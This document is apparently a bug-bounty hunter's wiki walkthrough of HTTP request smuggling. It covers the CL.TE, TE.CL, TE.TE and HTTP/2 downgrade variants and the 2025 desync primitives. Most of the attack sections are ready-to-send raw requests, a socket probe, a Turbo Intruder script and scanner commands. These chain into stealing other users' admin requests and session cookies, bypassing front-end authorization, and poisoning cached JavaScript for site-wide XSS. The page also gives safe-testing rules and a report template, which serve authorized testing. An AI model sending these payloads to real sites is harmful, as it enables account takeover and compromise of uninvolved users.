---
type: wiki
category: attack
tool: burp,smuggler
status: active
last-updated: 2026-08-23
---

# HTTP Request Smuggling Walkthrough

> **Use case:** Most modern websites have a frontend (CDN/LB/WAF) → backend architecture. If the two sides disagree on Content-Length / Transfer-Encoding parsing, you can smuggle.
> A high-frequency, high-payout PortSwigger / HackerOne category — P1-P2 findings are common (cache poisoning / auth bypass / stealing admin requests).

## 0. Core principle

HTTP/1.1 uses two ways to determine request body length:

```
Content-Length: 12     ← normal (CL)
Transfer-Encoding: chunked  ← chunked (TE)
```

If the frontend uses CL and the backend uses TE (or vice versa), an attacker can hide a second request inside one request, and the backend treats the hidden part as "the start of the next user's request."

### Four basic variants

| Variant | Frontend | Backend | Common scenario |
|------|------|------|---------|
| **CL.TE** | CL | TE | AWS ALB + backend that supports TE |
| **TE.CL** | TE | CL | nginx + Apache Tomcat |
| **TE.TE** | TE (obfuscated) | TE | Via obfuscation (`Transfer-Encoding: xchunked`) |
| **H2.CL / H2.TE** | HTTP/2 | HTTP/1.1 (with CL/TE directives) | Cloudflare / Akamai HTTP/2 frontends |

## 1. Detection (timing-difference method)

### Manual (curl + python)

```python
# CL.TE detection — if the backend reads TE, it will hang waiting for the next chunk and time out
import socket
payload = (
    "POST / HTTP/1.1\r\n"
    "Host: target.com\r\n"
    "Content-Length: 4\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "1\r\n"
    "A\r\n"
    "X"    # deliberately write an extra X — if the backend reads CL=4 it stops after reading, if it reads TE it hangs waiting for the chunk terminator
)
s = socket.create_connection(("target.com", 443))
s.sendall(payload.encode())
```

If the frontend timeout < the backend timeout: the backend hangs → a long delay → smuggling may exist.

### Automated: smuggler.py

```bash
# https://github.com/defparam/smuggler
git clone https://github.com/defparam/smuggler
cd smuggler

# Basic scan
python3 smuggler.py -u https://target.com --test all

# Only test CL.TE
python3 smuggler.py -u https://target.com --test basic

# Custom request file
python3 smuggler.py -u https://target.com -r request.txt
```

### Automated: Burp HTTP Request Smuggler (JS, ActiveScan++)

Burp Store → install "HTTP Request Smuggler" → right-click target → `Smuggle probe` → check Issues.

### Nuclei (crude)

```bash
nuclei -u https://target.com -t http/vulnerabilities/generic/http-desync.yaml
# High false-positive rate, recommend verifying with smuggler.py
```

## 2. CL.TE Smuggling (frontend uses CL / backend uses TE)

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**Parsing:**
- Frontend reads `Content-Length: 13` → sends the entire body (13 bytes, containing `0\r\n\r\nSMUGGLED`) to the backend as one request
- Backend reads `Transfer-Encoding: chunked` → `0\r\n\r\n` = end of chunks → first request ends
- `SMUGGLED` stays in the socket buffer → becomes the **start of the next user's request**

### Real-world use: stealing an admin's request

```http
POST /search HTTP/1.1
Host: target.com
Content-Length: 165
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
X-Ignore: X
```

When the next user (possibly an admin) sends a request, the backend appends their request line **right after our `X-Ignore: X`**, turning it into:

```
GET /admin HTTP/1.1
Host: target.com
X-Ignore: XGET / HTTP/1.1   ← the admin's real request gets stuffed in here
Cookie: session=ADMIN_TOKEN
...
```

→ our request gets routed to `/admin` with the admin's cookie attached → the admin page is returned to us.

## 3. TE.CL Smuggling (the reverse)

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

- Frontend TE → reads `8\r\nSMUGGLED\r\n0\r\n\r\n` (complete chunks) → treats it all as one request
- Backend CL=3 → only reads `8\r\n` (3 bytes) → the rest (`SMUGGLED\r\n0\r\n\r\n`) stays in the buffer → goes to the next user

## 4. TE.TE (obfuscation)

The frontend doesn't recognize an abnormal TE header, but the backend does → one side uses CL, the other uses TE.

```http
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
  Transfer-Encoding: chunked
Transfer-Encoding: chunked\x20
Transfer-Encoding:[tab]chunked
X-Transfer-Encoding: chunked
Transfer-Encoding: chunked\r\nX: X
Transfer-Encoding:\n chunked
```

smuggler.py's `--test all` automatically tries 40+ obfuscation variants.

## 5. HTTP/2 Downgrade (the modern mainstream)

HTTP/2 doesn't use CL/TE — it uses binary frames. But many CDNs/LBs **downgrade** HTTP/2 to HTTP/1.1 for the backend. An attacker can sneak a CL/TE header into HTTP/2, and it becomes effective after the downgrade.

### H2.CL

```
# HTTP/2 request (using curl --http2-prior-knowledge or nghttp2)
:method POST
:path /
:authority target.com
content-length 0    ← note: in HTTP/2 content-length is just a header, but the pseudo-header/frame length is the real body boundary

GET /admin HTTP/1.1
Host: target.com
```

The frontend HTTP/2 doesn't look at content-length (because HTTP/2 uses frame length) → the whole body is sent.
When downgraded, `content-length: 0` gets written into the HTTP/1.1 header → the backend reads CL=0, so the following `GET /admin` becomes a new request.

### H2.TE

```
:method POST
:path /
:authority target.com
transfer-encoding chunked

0

GET /admin HTTP/1.1
```

### Tools

- **Burp HTTP/2 message view** (Options → HTTP → "Allow HTTP/2 ALPN override")
- **smuggler.py with --http2**
- **h2csmuggler**: https://github.com/BishopFox/h2csmuggler

## 6. Real-world attack chains

### 6.1 Capture admin request → Steal cookie

```http
POST /abc HTTP/1.1
Host: target.com
Content-Length: 400
Transfer-Encoding: chunked

0

POST /log HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 300

data=
```

The next user's request gets stuffed after `data=` → the server writes the whole thing to `/log` (possibly a comment function, profile, etc. that the attacker can read) → their cookie is exposed.

### 6.2 Bypass frontend security (X-Forwarded-For / auth)

The frontend decides auth based on URL, but the backend receives the smuggled `/admin` → bypass.

```http
POST /api/public HTTP/1.1
Host: target.com
Content-Length: 55
Transfer-Encoding: chunked

0

GET /api/admin/users HTTP/1.1
X-Foo: x
```

### 6.3 Cache Poisoning (very powerful)

Write the smuggled request's response into the cache entry for "the next victim's request path."

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 130
Transfer-Encoding: chunked

0

GET /js/app.js HTTP/1.1
Host: target.com
User-Agent: attacker
X-Bypass: 1
```

The backend responds with `/js/app.js`'s response → the frontend cache pastes it onto the victim's `/js/app.js` → every user's JS gets replaced → site-wide XSS.

## 7. Safe testing rules

1. ✅ **Use the timing-difference method for detection first** (non-destructive)
2. ✅ **Use your own session cookie to test smuggled requests** (doesn't affect others)
3. ❌ **Don't test during high-traffic hours** (a victim's request path could get altered)
4. ❌ **Don't cause stored impact** (e.g. poisoning cache with site-wide js)
5. ✅ **Close the connection immediately after testing** (avoid a leftover buffer affecting the pool)

## 8. Full PoC workflow (Burp)

### Step 1: Detection
```
1. Proxy a normal request to target
2. Extensions → HTTP Request Smuggler → Launch smuggle probe
3. Wait for scan → Issues tab shows "Possible smuggling"
```

### Step 2: Verification (Turbo Intruder)
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        requestsPerConnection=100,
        pipeline=False
    )
    # deliberately smuggle
    smuggle = '''POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X: X'''
    engine.queue(smuggle)
    # immediately send a normal request → check if it was affected by the smuggle
    engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)
```

### Step 3: Reporting

Include:
- The exact CL/TE variant
- The full raw HTTP request
- Timing-difference proof (delay timing)
- Verification PoC (using your own account to demonstrate admin route access or request capture)
- Remediation suggestion (frontend/backend synchronize HTTP parser)

## 9. Nuclei quick-triage template

```yaml
id: http-smuggle-desync-test
info:
  name: HTTP Smuggling Time-based Detect
  severity: info
  author: hunter

http:
  - raw:
      - |+
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 4
        Transfer-Encoding: chunked

        1
        A
        X

    unsafe: true
    read-all: false
    matchers:
      - type: dsl
        dsl:
          - "duration >= 10"
```

## 10. Report template

```markdown
## Vulnerability Summary
https://target.com's CDN (Cloudflare) and backend (Spring Boot) disagree on how they parse
Transfer-Encoding, allowing CL.TE smuggling to steal the next user's session cookie.

## Detection
smuggler.py -u https://target.com --test basic
→ CL.TE Vulnerable

## PoC
[raw HTTP request]

Delay verification:
time { curl ... }
→ normal: 150ms / smuggle: 30s

## Impact
- Can steal any user's session cookie
- Can cache-poison /js/app.js → site-wide stored XSS

## Severity
P1 / Critical
```

## 11. 2025 Update — "HTTP/1.1 Must Die" (James Kettle, Black Hat / DEF CON 2025)

> The four classic variants above (§0–§5) are the **2019–2022 baseline**. In August 2025, PortSwigger's James Kettle published "HTTP/1.1 Must Die: The Desync Endgame" — new desync primitives that bypass the defenses most sites deployed *because* of the classic attacks, plus a parser-discrepancy detector (HTTP Request Smuggler v3.0) that finds them automatically. Confirmed 2025 bug bounty payouts from this exact research round: **T-Mobile $12,000, GitLab $7,000, Akamai $9,000 (root-caused to CVE-2025-32094), Cloudflare $7,000** — over **$276,000 total** across affected orgs, with Kettle reporting **$200k+ earned in roughly two weeks** of hunting, including one finding that gave cache-poisoning control over **24 million websites** via a CDN. If you tested a target for smuggling before 2025 and found nothing, that result is stale — re-test with the primitives below. (Sources: [PortSwigger — HTTP/1.1 Must Die: the desync endgame](https://portswigger.net/research/http1-must-die), [PortSwigger — what this means for bug bounty hunters](https://portswigger.net/blog/http-1-1-must-die-what-this-means-for-bug-bounty-hunters), [SecurityWeek coverage](https://www.securityweek.com/new-http-request-smuggling-attacks-impacted-cdns-major-orgs-millions-of-websites/), [Akamai's own CVE-2025-32094 writeup](https://www.akamai.com/blog/security/cve-2025-32094-http-request-smuggling).)

### 11.1 0.CL desync (the headline new primitive)

The front-end treats the request as having **no body** (`Content-Length: 0`, or it ignores/miscounts the real `Content-Length` value entirely — e.g. because the method is one it never expects a body on), while the back-end reads and honors the real `Content-Length`. Whatever bytes the front-end forwards after what it thought was the end of the request get absorbed by the back-end as **the start of the next request it reads** — the mirror image of classic CL.TE.

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 0

GET /admin HTTP/1.1
Host: target.com
X-Ignore: X
```

- **Frontend**: reads `Content-Length: 0` → treats the request as complete with an empty body → forwards only the headers down the pipe, but the socket still contains the `GET /admin...` bytes queued right behind it on the same connection.
- **Backend**: reads the body according to its own (different) length accounting for this request/method, sees the `GET /admin ...` bytes, and treats them as **the next request on the connection** → smuggled.
- This works even against backends that were hardened against CL.TE/TE.CL, because there is no TE header at all here — nothing for a "reject ambiguous CL+TE" defense to catch.
- PortSwigger ships a free interactive lab for the practical 0.CL case: https://portswigger.net/web-security/request-smuggling/browser/cl-0 (note: PortSwigger names the *lab* "CL.0" from the browser/client side of the same discrepancy family — read the lab description, not just the title, to confirm which direction applies to your target).

### 11.2 Chunk-extension desync

`Transfer-Encoding: chunked` bodies allow an optional, rarely-used **chunk extension** after the chunk-size field (`<size>;<extension-name>=<value>\r\n`). Most real-world parsers ignore chunk extensions — but not consistently, and not always the same way. A parser that treats the extension as part of the size field, or that stops reading the size field early because of a character the extension introduces, disagrees with a parser that strips it cleanly — that disagreement is a fresh desync primitive independent of CL vs TE.

```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked

1;ext=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
A
0

```
Try padding the extension value, adding a second `;`-separated extension, or putting a `\r` inside the extension value — the goal is to find one parser that treats the line differently than the other. This is exactly the class of check HTTP Request Smuggler v3.0 automates (below); do the manual version only after the automated pass flags a candidate, to keep the request count down.

Source for this primitive: [Imperva — "Smuggling Requests with Chunked Extensions: A New HTTP Desync Trick"](https://www.imperva.com/blog/smuggling-requests-with-chunked-extensions-a-new-http-desync-trick/).

### 11.3 Pause-based desync (timeout-driven, no header mismatch at all)

This primitive needs **no CL/TE disagreement whatsoever** — it exploits read-timeout behavior on a front-end that streams bytes to the back-end as it receives them (rather than buffering the whole request first):

1. Send the request headers promising a body (e.g. `Content-Length: 100`), then **stop sending** — hold the connection open without sending body bytes.
2. The front-end has already forwarded the headers (and any body bytes sent so far) to the back-end; the back-end is now blocked waiting for the promised 100 bytes.
3. Wait for the **back-end's read timeout** to fire. The back-end gives up waiting and treats what it received as a complete request, responding on the connection — but the front-end never saw an error and still considers the original request "in flight," and the connection stays open and pooled.
4. Now send the real body bytes (containing a smuggled request). The front-end forwards them as a continuation of the original request; the back-end — already reset and waiting for a *new* request on the same reused connection — reads them as the start of a fresh request.

Net effect: **CL.0-like smuggling on a target with no exploitable CL/TE parsing bug at all**, achieved purely through timing. This is why "we tested this backend and its CL/TE parsing is correct" is no longer sufficient to rule out desync. Requires the front-end to be a byte-streaming (not buffering) proxy — check with a slow-body timing probe first. Reference: [PortSwigger Web Security Academy — pause-based desync](https://portswigger.net/web-security/request-smuggling/browser/pause-based-desync).

### 11.4 CVE-2025-32094 — Akamai Ghost (worked example of a 2025-discovered real-world 0-day)

Root cause: an HTTP/1.x **OPTIONS** request carrying both an `Expect: 100-continue` header and **obsolete line folding** (a deprecated HTTP/1.1 feature where a header value continues on the next line, prefixed by whitespace) caused two Akamai Ghost servers in the same request path to parse the same request differently — letting an attacker smuggle a second request inside the first request's body. Discovered via Akamai's bug bounty program, disclosed alongside the Black Hat 2025 research, fixed in Akamai Ghost 2025-03-26+. Illustrative shape (do not send this against a target without authorization — reproduce only inside a lab or your own infra):

```http
OPTIONS / HTTP/1.1
Host: target.com
Expect: 100-continue
Foo: bar
 baz: this continuation line is the "obsolete line folding" — a leading space/tab means "still part of the previous header value"
Content-Length: 44

GET /admin HTTP/1.1
Host: target.com
X-Ignore: X
```

If two servers in the path disagree on whether the folded line is still part of `Foo`'s value or starts a new header, they disagree on where the header block ends — and therefore on where the body starts and how long it is. This exact vector is Akamai-specific (obsolete line folding + `Expect: 100-continue` on OPTIONS); do not assume it applies unmodified to other CDNs, but the general lesson — **rarely-tested header/method combinations are where 2025-era parser-discrepancy bugs live** — transfers directly. Full writeup: [Akamai's own advisory](https://www.akamai.com/blog/security/cve-2025-32094-http-request-smuggling).

### 11.5 Automated parser-discrepancy detection — HTTP Request Smuggler v3.0

```bash
# Burp Suite → BApp Store → "HTTP Request Smuggler" → update to v3.0+
# v3.0 adds parser-discrepancy detection: instead of only testing the classic
# CL.TE/TE.CL/TE.TE payload set, it fuzzes header/chunk syntax edge cases
# (obsolete line folding, chunk extensions, whitespace variants, 0.CL shapes)
# and flags where the *front-end's* interpretation of "is this valid" differs
# from a documented spec-compliant parse — the same discrepancy class behind
# CVE-2025-32094 and the chunk-extension trick above.
#
# Usage: right-click target in Burp → Extensions → HTTP Request Smuggler →
# "Smuggle probe" (as in §8), then separately run "Parser discrepancy scan"
# from the same context menu — it is a distinct scan mode from the classic probe.
```

PortSwigger also shipped a companion **"HTTP Hacker"** Burp extension alongside the 2025 research for manually crafting and observing exactly how a given server parses edge-case HTTP syntax (line folding, chunk extensions, whitespace) — use it to confirm *which side* (front-end/back-end) disagrees before building a smuggling payload around the discrepancy, rather than guessing.

### 11.6 What this changes for your testing checklist

- ❌ Do not conclude "not vulnerable" from CL.TE/TE.CL/TE.TE/H2.CL/H2.TE testing alone (§0–§5) — those are necessary, not sufficient, in 2025+.
- ✅ Re-test previously-cleared targets, especially anything behind Akamai, Cloudflare, or another major CDN — the 2025 research explicitly found the bug class in core CDN infrastructure, not just custom backends.
- ✅ Run the automated parser-discrepancy scan (§11.5) before manual chunk-extension/0.CL/pause-based probing — it is a much smaller number of requests than hand-testing every primitive above per endpoint.
- ✅ For pause-based desync specifically, a byte-streaming front-end is a prerequisite — confirm with a slow-body timing probe (send headers, then trickle the body one byte every few seconds, and see whether the back-end responds/times out mid-body) before investing time in the full 4-step chain in §11.3.
- Unverified / worth independently confirming before citing further: exact per-organization technical root cause for the T-Mobile and GitLab bounties beyond "desync via the 2025 primitive set" — the public reporting (SecurityWeek) gives payout figures and org names but not full technical writeups for those two specifically; treat "T-Mobile $12,000 / GitLab $7,000" as confirmed, and any more specific technical claim about *their* root cause beyond that as unverified.

## Related files

- [01-waf-bypass-playbook.md](01-waf-bypass-playbook.md) — attack surface behind a WAF
- [64-cache-poisoning.md](64-cache-poisoning.md) — one of smuggling's common impacts
- PortSwigger HTTP Desync Lab: https://portswigger.net/web-security/request-smuggling
- PortSwigger — HTTP/1.1 Must Die: the desync endgame (2025 research): https://portswigger.net/research/http1-must-die
- HTTP Request Smuggler (Burp extension, v3.0+ parser-discrepancy detection): https://github.com/portswigger/http-request-smuggler
- smuggler.py: https://github.com/defparam/smuggler
- h2csmuggler: https://github.com/BishopFox/h2csmuggler
